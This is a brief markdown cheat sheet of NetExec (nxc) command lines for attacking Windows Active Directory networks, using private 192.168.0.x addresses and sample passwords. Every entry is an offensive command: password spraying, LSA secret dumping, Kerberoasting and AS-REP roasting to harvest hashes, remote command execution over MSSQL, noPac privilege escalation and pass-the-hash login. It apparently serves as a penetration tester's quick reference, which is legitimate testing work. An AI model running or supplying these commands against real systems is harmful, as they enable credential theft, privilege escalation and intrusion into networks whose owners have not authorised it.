# Netexec Syntaxis
---

### SMB Enumeration
```bash
nxc smb 192.168.0.0/24

```

### Pasword Spraying
```bash
nxc smb 192.168.0.239 -u users.txt -p 'Summer2025!' --continue-on-success
```

### Privileged Users check
```bash
nxc smb 192.168.0.0/24 -u 'Administrator' -p 'sako2005!' --local-auth
```

### LSA Dump
```bash
nxc smb 192.168.0.239 -u 'Administrator' -p 'sako2005!' --lsa
```

### Kerberoasting
```bash
nxc ldap 192.168.0.239 -u 'Administrator' -p 'sako2005!' --kerberoasting hashes.txt
```

### Share Spidering
```bash
nxc smb 192.168.0.0/24 -u 'user1' -p 'pass1' --shares
```

### AS-REP Roasting
```bash
nxc ldap 192.168.0.239 -u users.txt -p '' --asreproast asrep.txt
```

### MSSQL Command Exec
```bash
nxc mssql 192.168.0.239 -u 'sql_svc' -p 'pass123' -x 'whoami'
```

### No-Pac / SamAccountName Abuse
```bash
nxc smb 192.168.0.239 -u 'user1' -p 'pass1' -M nopac
```

### Pass-the-Hash
```bash
nxc smb 192.168.0.239 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```
